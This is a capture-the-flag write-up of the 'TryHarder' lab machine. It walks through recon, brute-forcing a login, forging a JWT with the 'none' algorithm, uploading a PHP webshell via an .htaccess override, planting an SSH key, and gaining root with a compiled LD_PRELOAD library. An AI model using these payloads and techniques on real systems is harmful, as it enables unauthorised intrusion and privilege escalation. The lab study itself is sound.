# TryHarder

## Recon

::: details nmap_scan.log
```log
Open 10.0.2.57:22
Open 10.0.2.57:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.0.2.57

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 93:a4:92:55:72:2b:9b:4a:52:66:5c:af:a9:83:3c:fd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDKpc4iyFhIzxDvlJoPvgE9rRlFPOqHm4EkLgqXQkVf31csyjpvJgyZpTgr4gYV3oztsMmQbIj+nFGD+L5pQfaSXtAdxKpqt4D/MnFqVKP6KKGFhATWMCDzGXRaXQyaF7dOq49vkIoptczAU2af2PfwycA3aaI/lNPOYSHPRufkm102lE/lHZzNbXh0yJJXy9RJaqELeAibmqdrHFNpXFT8qAvsQrz/6IKJkia4JLdVbfeMdZBOQ9lIlQg+2VfKXp7pF7kGZKKttIThc8ROqlcOaxlmuC5oKEgFQP7obty1+6fx/QIuNn3D05FeQMqbvJfFZF1dE2IH4WEbFWRGH6w1
|   256 1e:a7:44:0b:2c:1b:0d:77:83:df:1d:9f:0e:30:08:4d (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAYupwIuJVRtRMDrYZ6fR/3p5E5vsqXADwGAoZ2RW5vKPxDV3j/+QjGbnRDj1iD5/iwZxxlUggSr5raZfzAHrZA=
|   256 d0:fa:9d:76:77:42:6f:91:d3:bd:b5:44:72:a7:c9:71 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAOshh8VG4l9hWlVYWfAvLuWuwPEdiF8EXmm5BFib/+q
80/tcp open  http    syn-ack Apache httpd 2.4.59 ((Debian))
|_http-title: \xE8\xA5\xBF\xE6\xBA\xAA\xE6\xB9\x96\xE7\xA7\x91\xE6\x8A\x80 - \xE4\xBC\x81\xE4\xB8\x9A\xE9\x97\xA8\xE6\x88\xB7\xE7\xBD\x91\xE7\xAB\x99
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.59 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
:::

## HTTP

![writeup.png](/assets/pentest/hackmyvm/tryharder/writeup.png)

### Hidden Path

In source code we can see a comment about API path
```bash
‚îî‚îÄ$ curl -s http://tryharder.hmv/  | grep API | trans :en
/* Ë∞ÉËØï‰ø°ÊÅØÔºöAPIË∑ØÂæÑ /NzQyMjE= */
    /* Debug information: API path /NzQyMjE= */
```

```bash
‚îî‚îÄ$ curl http://tryharder.hmv/NzQyMjE= -o /dev/null -s -w "%{http_code}\n"
404

‚îî‚îÄ$ curl http://tryharder.hmv/74221 -o /dev/null -s -w "%{http_code}\n"
301
```

Only this page is hidden
```bash
‚îî‚îÄ$ feroxbuster -u http://tryharder.hmv -w <(seq 1 100000) --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -S 278
301      GET        9l       28w      314c http://tryharder.hmv/74221 => http://tryharder.hmv/74221/
```

![writeup-1.png](/assets/pentest/hackmyvm/tryharder/writeup-1.png)

```bash
‚îî‚îÄ$ feroxbuster -u http://tryharder.hmv/74221/ -w /usr/share/seclists/Discovery/Web-Content/common.txt --thorough -D -C 404,400,414,500 --dont-scan css,png,jpeg,jpg,gif -n -x .php,.html,.txt -S 278
200      GET       79l      162w     2174c http://tryharder.hmv/74221/
302      GET        0l        0w        0c http://tryharder.hmv/74221/dashboard.php => index.php
200      GET       79l      162w     2174c http://tryharder.hmv/74221/index.php
301      GET        9l       28w      322c http://tryharder.hmv/74221/uploads => http://tryharder.hmv/74221/uploads/
```

`uploads/` has directory called `999/` but it's empty.

### Brute-force Login

Looks like we have to brute-force the login page. Since we don't know usernames or passwords let's go with small and simple payloads (ü§û)
```bash
‚îî‚îÄ$ hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/500-worst-passwords.txt tryharder.hmv http-post-form "/74221/index.php:username=^USER^&password=^PASS^:Invalid username or password"
[80][http-post-form] host: tryharder.hmv   login: test   password: 123456
```

![writeup-2.png](/assets/pentest/hackmyvm/tryharder/writeup-2.png)

### Forge JWT

When we login we get a JWT token
```bash
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc1NzY3MDgzMX0.x54L5qCuc40NxmxNlXlyOTYe_QrRvTJc-7HlD-DqVBw
```

Decode
```bash
‚îî‚îÄ$ jwt_tool 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc1NzY3MDgzMX0.x54L5qCuc40NxmxNlXlyOTYe_QrRvTJc-7HlD-DqVBw'
Token header values:
[+] alg = "HS256"
[+] typ = "JWT"

Token payload values:
[+] sub = "123"
[+] role = "user"
[+] exp = 1757670831    ==> TIMESTAMP = 2025-09-12 09:53:51 (UTC)
```

Try cracking the password for JWT
```bash
‚îî‚îÄ$ jwt_tool 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjMiLCJyb2xlIjoidXNlciIsImV4cCI6MTc1NzY3MDgzMX0.x54L5qCuc40NxmxNlXlyOTYe_QrRvTJc-7HlD-DqVBw' -C -d /wordlists/rockyou.txt
///
```

While waiting might as well try other techniques, simplest being `none` algorithm -> [https://token.dev](https://token.dev) 

![writeup-3.png](/assets/pentest/hackmyvm/tryharder/writeup-3.png)

> **Note**: Do mind that this tool deletes last dot (`.`) with algorithm, JWT requires 3 chunks so it may fail without last dot!

![writeup-4.png](/assets/pentest/hackmyvm/tryharder/writeup-4.png)

### File Upload

Tried uploading PHP but failed.

![writeup-5.png](/assets/pentest/hackmyvm/tryharder/writeup-5.png)

```bash
‚îî‚îÄ$ head -c 100 ~/Pictures/usb.jpg > shell.jpg.php
‚îî‚îÄ$ echo '<?php system($_REQUEST[0]); ?>' >> shell.jpg.php
‚îî‚îÄ$ file shell.jpg.php
shell.jpg.php: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16
```

Doesn't work

![writeup-6.png](/assets/pentest/hackmyvm/tryharder/writeup-6.png)

Looks like we strictly can only upload files that end with `.jpg` or `.png` and no other extension is allowed.

Well okay, scratch that. We can upload files, but not PHP? Since we are allowed to upload `.htaccess` we can modify how files are processed by PHP.

![writeup-7.png](/assets/pentest/hackmyvm/tryharder/writeup-7.png)

Update `.htaccess` to be smth like:
```bash
AddType application/x-httpd-php .jpg
AddHandler application/x-httpd-php .jpg
```

Upload desired webshell as `jpg` 

![writeup-8.png](/assets/pentest/hackmyvm/tryharder/writeup-8.png)

Some creds
```bash
www-data@Tryharder:‚Ä¶/html/74221# cat index.php
...
    $users = [
        'test' => ['password' => '123456', 'id' => '123', 'role' => 'user'],
        'admin' => ['password' => 'ComplexP@ssw0rd', 'id' => '999', 'role' => 'admin']
    ];
```

Intentional vulnerability, very nice
```bash
www-data@Tryharder:‚Ä¶/html/74221# cat xiixhu-upload.php
...
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $filename = basename($file['name']);
    $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
    $allowed = ['jpg', 'png', 'htaccess'];
    if (in_array($ext, $allowed)) 
```

## Lateral Movement (pentester)

Ha?
```bash
www-data@Tryharder:‚Ä¶/html/74221# grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
pentester:x:1000:1000:Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight...:/home/pentester:/bin/bash
xiix:x:1001:1001:A Tale of Two Cities:/home/xiix:/bin/bash
```

```bash
www-data@Tryharder:‚Ä¶/html/74221# ps aux | grep -e xiix -e pentester -i
xiix      6367  0.0  0.0   2384   644 ?        Ss   04:29   0:00 /bin/sh -c /srv/backdoor.py
xiix      6369  0.0  0.8  19260  8520 ?        S    04:29   0:00 python /srv/backdoor.py
www-data 15971  0.0  0.0   2384   764 ?        S    05:17   0:00 sh -c ps aux | grep -e xiix -e pentester -i 2>&1
www-data 15973  0.0  0.0   3080   816 ?        S    05:17   0:00 grep -e xiix -e pentester -i

www-data@Tryharder:‚Ä¶/html/74221# ls /srv -lah
total 16K
drwxr-xr-x  2 root root 4.0K Mar 23 23:42 .
drwxr-xr-x 18 root root 4.0K Nov 13  2020 ..
-rw-r--r--  1 root root  161 Mar 23 11:28 ...
-rwx------  1 xiix xiix 1012 Mar 23 23:42 backdoor.py

www-data@Tryharder:‚Ä¶/html/74221# cat /srv/backdoor.py
cat: /srv/backdoor.py: Permission denied

www-data@Tryharder:/var/www/html/74221/uploads/123$ cat /srv/...
Iuwbtthfbetuoftimfs"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../

www-data@Tryharder:‚Ä¶/html/74221# ss -tunlp4
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*
tcp     LISTEN   0        5              127.0.0.1:8989          0.0.0.0:*
```

If we try to connect with `nc` nothing happens, the `...` seems encrypted?

Pentester's comment and this encrypted blob look awfully similar
```bash
www-data@Tryharder:/var/www/html/74221/uploads/123$ grep pentester /etc/passwd | awk -F ':' '{print($5)}'
Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight...
www-data@Tryharder:/var/www/html/74221/uploads/123$ cat /srv/...
Iuwbtthfbetuoftimfs"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../
```

Length is 160, perfectly divisible by 8. Search for differences and make a bit stream?
```bash
plain = "Itwasthebestoftimes!itwastheworstoftimes@itwastheageofwisdom#itwastheageoffoolishness$itwastheepochofbelief,itwastheepochofincredulity,&itwastheseasonofLight..."
cipher = "Iuwbtthfbetuoftimfs\"iuwbsuhfxpsttoguinet@jtwbttieahfogwiseon#iuxatthfageofgpoljthoess%itwbsuiffqocipfbemieg-iuxbsuhffqpdhogjocredvljtz,'iuwasuhesfasooofLjgiu../"
diff = ''.join(['1' if a == b else '0' for a, b in zip(plain, cipher)])        # Match = 1, Diff = 0
password = ''.join([chr(int(diff[i:i+8], 2)) for i in range(0, len(diff), 8)]) # Binary -> Ascii
print(password)

diff = ''.join(['0' if a == b else '1' for a, b in zip(plain, cipher)])        # Match = 0, Diff = 1
password = ''.join([chr(int(diff[i:i+8], 2)) for i in range(0, len(diff), 8)]) # Binary -> Ascii
print(password)
```

```
¬¶√è¬™ √ä¬≤√ã¬¨¬∑√å¬ª √é√à √á¬™¬ª¬ª¬¶ # 10
Y0U_5M4SH3D_17_8UDDY # 01
```

## SSH

```bash
‚îî‚îÄ$ sshpass -p 'Y0U_5M4SH3D_17_8UDDY' ssh pentester@tryharder.hmv
pentester@Tryharder:~$ id
uid=1000(pentester) gid=1000(pentester) groups=1000(pentester)
```

### User.txt

```bash
pentester@Tryharder:~$ cat user.txt
Flag{c4f9375f9834b4e7f0a528cc65c055702bf5f24a}
```

## Privilege Escalation (xiix)

```bash
pentester@Tryharder:~$ sudo -l
Matching Defaults entries for pentester on tryharder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User pentester may run the following commands on tryharder:
    (ALL : ALL) NOPASSWD: /usr/bin/find
```

`exec` flag seems to doesn't work
```bash
pentester@Tryharder:~$ find . -maxdepth 1 -exec echo {} \;
find: critical error - Segmentation fault (core dumped)
```

I had to cheat a bit here, when going over writeup I noticed people connecting to backdoor, but when I did that it was not working. After restarting box it worked :((

```bash
pentester@Tryharder:~$ nc 0 8989
Enter password: Y0U_5M4SH3D_17_8UDDY
Access granted!
shell> id
uid=1001(xiix) gid=1001(xiix) groups=1001(xiix)

shell> ls -alh
total 44K
drwxr-xr-x 3 xiix xiix 4.0K Mar 25 01:32 .
drwxr-xr-x 4 root root 4.0K Mar 23 10:46 ..
-rw------- 1 root root    0 Mar 25 07:20 .bash_history
-rw-r--r-- 1 xiix xiix  220 Apr 18  2019 .bash_logout
-rw-r--r-- 1 xiix xiix 3.5K Mar 23 12:05 .bashrc
---x------ 1 xiix xiix  18K Mar 25 01:32 guess_game
drwxr-xr-x 3 xiix xiix 4.0K Mar 23 23:44 .local
-rw-r--r-- 1 xiix xiix  807 Apr 18  2019 .profile
---------------------------------------------------------
‚îî‚îÄ$ ssh-keygen -f id_rsa -q -P x && cat id_rsa.pub
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJrW5AZh8M0chty2L9FGyr2oBh4ZxUci/Z18GzUB2Ou9 woyag@kraken
---------------------------------------------------------
shell> mkdir ~/.ssh && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJrW5AZh8M0chty2L9FGyr2oBh4ZxUci/Z18GzUB2Ou9 woyag@kraken' > ~/.ssh/authorized_keys
```

> **Note:** Oops, I think my initial connection with the `p0wny` shell was still hanging üòÖ I ended up sabotaging myself. Good job me.

```bash
‚îî‚îÄ$ ssh -i id_rsa xiix@tryharder.hmv
xiix@Tryharder:~$ id
uid=1001(xiix) gid=1001(xiix) groups=1001(xiix)
xiix@Tryharder:~$ find . -type f -ls
   148006      4 -rw-r--r--   1 xiix     xiix          807 Apr 18  2019 ./.profile
   140438      4 -rw-r--r--   1 xiix     xiix         3549 Mar 23 12:05 ./.bashrc
   148008      4 -rw-r--r--   1 xiix     xiix          220 Apr 18  2019 ./.bash_logout
   148161      4 -rw-r--r--   1 xiix     xiix           94 Sep 12 05:55 ./.ssh/authorized_keys
   131378     20 ---x------   1 xiix     xiix        17584 Mar 25 01:32 ./guess_game
   131746      0 -rw-------   1 root     root            0 Mar 25 07:20 ./.bash_history
```

## Privilege Escalation (root)

### xiix password

```bash
xiix@Tryharder:~$ ./guess_game
===== ÁªàÊûÅËøêÊ∞îÊåëÊàò / Ultimate Luck Challenge ====
I have a number (0-99), you get one guess.
Guess right, I‚Äôll give your reward; wrong? Hehe, face the consequences!
Hint: Smart ones might find a shortcut.
Your guess (0-99): 1
Wrong guess!
SSecret number: 56
Formatting disk... (Kidding!)
```

I expected it to be ELF, but it's a shellscript
```bash
xiix@Tryharder:~$ echo 1111111111111111111111111111111 | ./guess_game >/dev/null
./guess_game: line 29: [: 1111111111111111111111111111111: integer expression expected
```

Only numbers are allowed, that a strict check inside script. We can bruteforce since threshold is small and we can get it within minutes or so.
```bash
#!/bin/bash
while true; do
    out=$(echo '21' | ./guess_game)
    if ! echo "$out" | grep -q "Wrong"; then
        echo "$out"
        break
    fi
done
```

```bash
xiix@Tryharder:~$ time while true; do out=$(echo '21' | ./guess_game); if ! echo "$out" | grep -q "Wrong"; then echo "$out"; break; fi; done
...
Pass: superxiix

real    1m2.354s
user    0m0.805s
sys     0m0.509s
```

Alternatively you can find the "hint" using `pspy`
```bash
‚îî‚îÄ$ scp -i id_rsa /opt/scripts/enum/pspy64 xiix@tryharder.hmv:/tmp/pspy
xiix@Tryharder:~$ chmod +x /tmp/pspy
xiix@Tryharder:~$ /tmp/pspy -f &
xiix@Tryharder:~$ ./guess_game
...
Hint: Smart ones might find a shortcut.
2025/09/12 06:19:53 FS:               CREATE | /tmp/.hidden_clue
2025/09/12 06:19:53 FS:                 OPEN | /tmp/.hidden_clue
2025/09/12 06:19:53 FS:               MODIFY | /tmp/.hidden_clue
2025/09/12 06:19:53 FS:          CLOSE_WRITE | /tmp/.hidden_clue
...
xiix@Tryharder:~$ pkill -f pspy
```

![writeup-9.png](/assets/pentest/hackmyvm/tryharder/writeup-9.png)

### LD_PRELOAD

```bash
xiix@Tryharder:~$ sudo -l
[sudo] password for xiix: superxiix
Matching Defaults entries for xiix on tryharder:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, env_keep+=LD_PRELOAD

User xiix may run the following commands on tryharder:
    (ALL : ALL) /bin/whoami
```

`whoami` command will not be useful in privilege escalation, but the `env_keep+=LD_PRELOAD` will be.

[https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ld_preload--ld_library_path](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ld_preload--ld_library_path)

```bash
xiix@Tryharder:~$ echo $'#include <stdio.h>\n#include <sys/types.h>\n#include <stdlib.h>\nvoid _init() { unsetenv("LD_PRELOAD"); setgid(0); setuid(0); system("/bin/bash -p"); }' | gcc -fPIC -shared -o pe.so -nostartfiles -x c -
xiix@Tryharder:~$ sudo LD_PRELOAD=./pe.so whoami
root@Tryharder:/home/xiix# id
uid=0(root) gid=0(root) groups=0(root)
```

### Root.txt

```
root@Tryharder:/home/xiix# cat /root/root.txt
Flag{7ca62df5c884cd9a5e5e9602fe01b39f9ebd8c6f}
```

## P.S.

```bash
root@Tryharder:~# cat congrats.txt
        ____  ____  ____  ____  ____  ____  ____  ____  ____  ____  _
       /    \/    \/    \/    \/    \/    \/    \/    \/    \/    \/ \
      /_______________________________________________________________\
      |                                                               |
      |  *** CONGRATULATIONS! YOU'VE CONQUERED THE TARGET RANGE! ***  |
      |_______________________________________________________________|

   YOU ARE A TRUE HACKER LEGEND!
   The Xiixhu Tech bows to your skills!

   What's Next?
   - Join our elite crew!
   - QQ Group: 660930334
   - Welcome aboard, mastermind!

   Try Harder!
   Keep hacking, keep winning!

   [ Tip: Root password is hidden in the congrats message! Dig deeper! ]
```